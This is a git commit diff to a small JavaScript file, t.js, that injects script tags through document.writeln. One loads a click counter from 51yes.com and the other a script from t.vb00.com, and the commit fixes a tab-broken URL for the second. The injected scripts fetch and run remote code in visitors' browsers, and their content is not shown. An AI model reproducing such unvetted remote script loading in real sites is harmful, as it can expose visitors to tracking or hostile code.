8f6187e47282079bcd7bffcace357ff64b70b999
tzjs <tzjs@gmx.com>
2015-12-26 11:14:00 +0800

    Update t.js

--- m1/t.js
+++ m1/t.js
@@ -1,4 +1,5 @@
 document.writeln("<script language=\"javascript\" src=\"http:\/\/count24.51yes.com\/click.aspx?id=248527671&logo=12\" charset=\"gb2312\"><\/script>");
 
-document.writeln("<script src=http:\/\/\t.vb00.com\/t1.js ><\/script>");
 
+
+document.writeln("<script src=http:\/\/t.vb00.com\/t1.js ><\/script>");
